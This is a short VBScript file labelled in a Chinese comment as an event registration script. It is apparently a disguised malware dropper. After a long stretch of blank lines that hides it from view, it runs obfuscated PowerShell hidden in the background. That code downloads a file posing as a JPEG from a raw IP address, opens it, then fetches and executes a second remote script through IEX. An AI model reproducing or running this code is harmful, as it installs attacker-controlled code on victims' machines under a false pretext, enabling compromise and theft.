' 活动报名脚本
Function enterFor(Arg)
	Set oShell = CreateObject("Wscript.Shell")
	Dim sArgs : sArgs = Arg
	if Len(Arg)>2 then
		iReturn = oShell.Run(sArgs, 0, True)
	end if
End Function
Function enterFor1(Arg)
	Dim wshShell
	Set wshShell = Wscript.CreateObject("Wscript.Shell")
	wshShell.Run(Arg)
	WScript.Sleep 1000
	wshShell.SendKeys "{F5}"
End Function

enterFor("")


































enterFor("powershell.exe -""""NoExit ""$c1='I#SEX(New-O#Sbject N#Set.We#SbClient).Down#Slo'.Replace('#S','');$c2='123(''ht''+''tp:/''+''/106''+''.55.2''+''31.8''+''8:45''+''45/AnglaBaby.jpeg'',''C:\temp\AnglaBaby.jpeg'')'.Replace('123','adFile');IEX ($c1+$c2)""")
enterFor1("C:\temp\AnglaBaby.jpeg")
enterFor("powershell.exe -""""NoExit ""$c1='I#SEX(New-O#Sbject N#Set.We#SbClient).Down#Slo'.Replace('#S','');$c2='123(''ht''+''tp:/''+''/106''+''.55.2''+''31.8''+''8:887''+''2/a'')'.Replace('123','adString');IEX ($c1+$c2)""")